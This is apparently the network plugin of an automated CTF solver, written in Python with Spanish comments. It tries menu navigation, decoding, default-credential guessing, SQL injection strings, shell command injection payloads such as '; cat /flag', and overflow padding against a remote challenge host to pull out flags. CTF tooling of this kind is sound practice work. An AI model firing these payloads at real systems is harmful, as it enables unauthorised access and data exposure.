"""
Plugin de Red - Para desafíos CTF remotos
"""

import asyncio
import re
from typing import List, Dict, Any, Optional
import time

from ..base import CryptoPlugin
from ...models.data import ChallengeData, SolutionResult, PluginInfo, ChallengeType
from ...core.network_connector import NetworkConnector, NetworkResponse
from ...utils.logging import get_logger


class NetworkPlugin(CryptoPlugin):
    """Plugin para desafíos CTF que requieren interacción de red"""
    
    def __init__(self):
        super().__init__()
        self.network_connector = NetworkConnector()
        
        # Estrategias de interacción comunes
        self.interaction_strategies = [
            self._strategy_menu_navigation,
            self._strategy_crypto_challenge,
            self._strategy_auth_bypass,
            self._strategy_command_injection,
            self._strategy_buffer_overflow,
            self._strategy_simple_interaction
        ]
    
    def _create_plugin_info(self) -> PluginInfo:
        return PluginInfo(
            name="network_ctf",
            version="1.0.0",
            description="Plugin para desafíos CTF remotos con interacción de red",
            supported_types=[ChallengeType.NETWORK, ChallengeType.MIXED],
            techniques=[
                "interactive_session", "menu_navigation", "crypto_challenge",
                "auth_bypass", "command_injection", "buffer_overflow",
                "automated_interaction", "pattern_recognition"
            ],
            priority=75
        )
    
    def can_solve(self, challenge_data: ChallengeData) -> float:
        """Evaluar si puede manejar el desafío de red"""
        confidence = 0.0
        
        # Verificar si tiene información de red
        if challenge_data.network_info:
            confidence += 0.8
        
        # Verificar tipo de desafío
        if challenge_data.challenge_type == ChallengeType.NETWORK:
            confidence += 0.9
        elif challenge_data.challenge_type == ChallengeType.MIXED:
            confidence += 0.4
        
        # Buscar indicadores de red en archivos
        for file_info in challenge_data.files:
            if self._is_text_file(file_info):
                content = self._read_file_content(file_info.path)
                if content:
                    network_score = self._analyze_network_content(content)
                    confidence += network_score * 0.3
        
        return min(confidence, 1.0)
    
    def solve(self, challenge_data: ChallengeData) -> SolutionResult:
        """Resolver desafío de red"""
        if not challenge_data.network_info:
            return self._create_failure_result("No hay información de red disponible")
        
        self.logger.info(f"Resolviendo desafío de red: {challenge_data.network_info.host}:{challenge_data.network_info.port}")
        
        # Ejecutar resolución asíncrona
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            result = loop.run_until_complete(self._solve_async(challenge_data))
            return result
        finally:
            loop.close()
    
    async def _solve_async(self, challenge_data: ChallengeData) -> SolutionResult:
        """Resolución asíncrona del desafío"""
        network_info = challenge_data.network_info
        
        try:
            # Probar conexión
            if not await self.network_connector.test_connection(network_info):
                return self._create_failure_result("No se pudo establecer conexión")
            
            # Establecer conexión persistente
            connection_id = await self.network_connector.connect(network_info)
            
            try:
                # Probar diferentes estrategias
                for strategy in self.interaction_strategies:
                    self._check_timeout()
                    
                    self.logger.info(f"Probando estrategia: {strategy.__name__}")
                    result = await strategy(connection_id, challenge_data)
                    
                    if result.success:
                        return result
                    
                    # Reconectar para próxima estrategia
                    await self.network_connector.disconnect(connection_id)
                    connection_id = await self.network_connector.connect(network_info)
                
                return self._create_failure_result("Ninguna estrategia fue exitosa")
                
            finally:
                await self.network_connector.disconnect(connection_id)
                
        except Exception as e:
            self.logger.error(f"Error en resolución de red: {e}")
            return self._create_failure_result(f"Error de red: {str(e)}")
    
    def _is_text_file(self, file_info) -> bool:
        """Verificar si es archivo de texto"""
        if file_info.mime_type and 'text' in file_info.mime_type:
            return True
        
        text_extensions = {'.txt', '.md', '.py', '.sh', '.conf', '.cfg'}
        return file_info.path.suffix.lower() in text_extensions
    
    def _analyze_network_content(self, content: str) -> float:
        """Analizar contenido para detectar elementos de red"""
        confidence = 0.0
        content_lower = content.lower()
        
        # Patrones de red
        network_patterns = [
            'netcat', 'nc', 'socket', 'connect', 'server', 'client',
            'tcp', 'udp', 'port', 'host', 'ip', 'address',
            'telnet', 'ssh', 'http', 'https'
        ]
        
        for pattern in network_patterns:
            if pattern in content_lower:
                confidence += 0.1
        
        # Detectar direcciones IP y puertos
        if re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', content):
            confidence += 0.2
        
        if re.search(r':\d{2,5}\b', content):  # Puertos
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    async def _strategy_menu_navigation(self, connection_id: str, challenge_data: ChallengeData) -> SolutionResult:
        """Estrategia de navegación por menús"""
        self.logger.info("Probando navegación por menús")
        
        try:
            responses = await self.network_connector.interactive_session(connection_id, max_interactions=20)
            
            # Buscar flag en las respuestas
            for response in responses:
                if response.success:
                    flag = self.network_connector.extract_flag(response.data)
                    if flag:
                        return self._create_success_result(
                            flag=flag,
                            method="menu_navigation",
                            confidence=0.9,
                            interaction_count=len(responses)
                        )
            
            return self._create_failure_result("No se encontró flag en navegación por menús")
            
        except Exception as e:
            return self._create_failure_result(f"Error en navegación por menús: {str(e)}")
    
    async def _strategy_crypto_challenge(self, connection_id: str, challenge_data: ChallengeData) -> SolutionResult:
        """Estrategia para desafíos de criptografía remotos"""
        self.logger.info("Probando desafío de criptografía remoto")
        
        try:
            # Recibir mensaje inicial
            initial_response = await self.network_connector.receive_data(connection_id, timeout=5)
            
            if not initial_response.success:
                return self._create_failure_result("No se recibió mensaje inicial")
            
            text = initial_response.data.decode('utf-8', errors='ignore')
            
            # Buscar diferentes tipos de cifrados
            crypto_responses = []
            
            # Base64
            base64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
            for match in base64_matches:
                try:
                    import base64
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    response = await self.network_connector.send_data(connection_id, decoded)
                    crypto_responses.append(response)
                except:
                    continue
            
            # Hexadecimal
            hex_matches = re.findall(r'[0-9a-fA-F]{20,}', text)
            for match in hex_matches:
                try:
                    decoded = bytes.fromhex(match).decode('utf-8', errors='ignore')
                    response = await self.network_connector.send_data(connection_id, decoded)
                    crypto_responses.append(response)
                except:
                    continue
            
            # César (probar shifts comunes)
            for shift in [13, 1, 3, 5, 7]:  # ROT13 y otros comunes
                caesar_decoded = self._caesar_decrypt(text, shift)
                if caesar_decoded != text:  # Si cambió algo
                    response = await self.network_connector.send_data(connection_id, caesar_decoded)
                    crypto_responses.append(response)
            
            # Buscar flag en respuestas
            for response in crypto_responses:
                if response.success:
                    flag = self.network_connector.extract_flag(response.data)
                    if flag:
                        return self._create_success_result(
                            flag=flag,
                            method="crypto_challenge",
                            confidence=0.9
                        )
            
            return self._create_failure_result("No se resolvió el desafío de criptografía")
            
        except Exception as e:
            return self._create_failure_result(f"Error en desafío de criptografía: {str(e)}")
    
    async def _strategy_auth_bypass(self, connection_id: str, challenge_data: ChallengeData) -> SolutionResult:
        """Estrategia de bypass de autenticación"""
        self.logger.info("Probando bypass de autenticación")
        
        try:
            # Credenciales comunes
            credentials = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', ''),
                ('root', 'root'),
                ('guest', 'guest'),
                ('test', 'test'),
                ('user', 'user')
            ]
            
            # SQL injection payloads
            sql_payloads = [
                "admin' OR '1'='1",
                "admin' OR 1=1--",
                "' OR '1'='1' --",
                "admin'/*",
                "' UNION SELECT 1--"
            ]
            
            # Recibir prompt inicial
            initial_response = await self.network_connector.receive_data(connection_id, timeout=5)
            
            # Probar credenciales comunes
            for username, password in credentials:
                # Enviar username
                response = await self.network_connector.send_data(connection_id, username)
                if not response.success:
                    continue
                
                # Enviar password
                response = await self.network_connector.send_data(connection_id, password)
                if response.success:
                    flag = self.network_connector.extract_flag(response.data)
                    if flag:
                        return self._create_success_result(
                            flag=flag,
                            method="auth_bypass",
                            confidence=0.8,
                            credentials=(username, password)
                        )
            
            # Probar SQL injection
            for payload in sql_payloads:
                response = await self.network_connector.send_data(connection_id, payload)
                if response.success:
                    flag = self.network_connector.extract_flag(response.data)
                    if flag:
                        return self._create_success_result(
                            flag=flag,
                            method="sql_injection",
                            confidence=0.9,
                            payload=payload
                        )
            
            return self._create_failure_result("No se pudo hacer bypass de autenticación")
            
        except Exception as e:
            return self._create_failure_result(f"Error en bypass de autenticación: {str(e)}")
    
    async def _strategy_command_injection(self, connection_id: str, challenge_data: ChallengeData) -> SolutionResult:
        """Estrategia de inyección de comandos"""
        self.logger.info("Probando inyección de comandos")
        
        try:
            # Payloads de command injection
            payloads = [
                "; cat flag.txt",
                "; ls -la",
                "; cat /flag",
                "; find / -name '*flag*' 2>/dev/null",
                "| cat flag.txt",
                "&& cat flag.txt",
                "`cat flag.txt`",
                "$(cat flag.txt)",
                "; cat flag",
                "; cat FLAG",
                "; printenv | grep FLAG"
            ]
            
            for payload in payloads:
                response = await self.network_connector.send_data(connection_id, payload)
                if response.success:
                    flag = self.network_connector.extract_flag(response.data)
                    if flag:
                        return self._create_success_result(
                            flag=flag,
                            method="command_injection",
                            confidence=0.9,
                            payload=payload
                        )
                    
                    # También buscar contenido que parezca flag
                    text = response.data.decode('utf-8', errors='ignore')
                    if 'CTF{' in text or 'FLAG{' in text or len(text.strip()) > 10:
                        potential_flag = text.strip()
                        if len(potential_flag) < 200:  # No demasiado largo
                            return self._create_success_result(
                                flag=potential_flag,
                                method="command_injection",
                                confidence=0.7,
                                payload=payload
                            )
            
            return self._create_failure_result("No se encontraron vulnerabilidades de command injection")
            
        except Exception as e:
            return self._create_failure_result(f"Error en command injection: {str(e)}")
    
    async def _strategy_buffer_overflow(self, connection_id: str, challenge_data: ChallengeData) -> SolutionResult:
        """Estrategia básica de buffer overflow"""
        self.logger.info("Probando buffer overflow básico")
        
        try:
            # Payloads de diferentes tamaños
            overflow_sizes = [100, 200, 500, 1000, 2000]
            
            for size in overflow_sizes:
                # Crear payload de overflow
                payload = 'A' * size
                
                response = await self.network_connector.send_data(connection_id, payload)
                if response.success:
                    flag = self.network_connector.extract_flag(response.data)
                    if flag:
                        return self._create_success_result(
                            flag=flag,
                            method="buffer_overflow",
                            confidence=0.8,
                            payload_size=size
                        )
                    
                    # Buscar cambios en el comportamiento
                    text = response.data.decode('utf-8', errors='ignore')
                    if 'segmentation fault' in text.lower() or 'core dumped' in text.lower():
                        # Posible overflow, pero sin flag visible
                        continue
            
            return self._create_failure_result("No se encontraron vulnerabilidades de buffer overflow")
            
        except Exception as e:
            return self._create_failure_result(f"Error en buffer overflow: {str(e)}")
    
    async def _strategy_simple_interaction(self, connection_id: str, challenge_data: ChallengeData) -> SolutionResult:
        """Estrategia de interacción simple"""
        self.logger.info("Probando interacción simple")
        
        try:
            # Inputs comunes
            simple_inputs = [
                '',           # Solo enter
                'help',
                'flag',
                'cat flag',
                'ls',
                'dir',
                'show flag',
                'get flag',
                'admin',
                'password',
                '1',
                'yes',
                'y'
            ]
            
            for input_text in simple_inputs:
                response = await self.network_connector.send_data(connection_id, input_text)
                if response.success:
                    flag = self.network_connector.extract_flag(response.data)
                    if flag:
                        return self._create_success_result(
                            flag=flag,
                            method="simple_interaction",
                            confidence=0.7,
                            input_used=input_text
                        )
            
            return self._create_failure_result("Interacción simple no produjo resultados")
            
        except Exception as e:
            return self._create_failure_result(f"Error en interacción simple: {str(e)}")
    
    def _caesar_decrypt(self, text: str, shift: int) -> str:
        """Descifrado César simple"""
        result = []
        for char in text:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                shifted = (ord(char) - base - shift) % 26
                result.append(chr(base + shifted))
            else:
                result.append(char)
        return ''.join(result)
    
    def __del__(self):
        """Cleanup al destruir el plugin"""
        if hasattr(self, 'network_connector'):
            # Cerrar conexiones pendientes
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self.network_connector.disconnect_all())
                loop.close()
            except:
                pass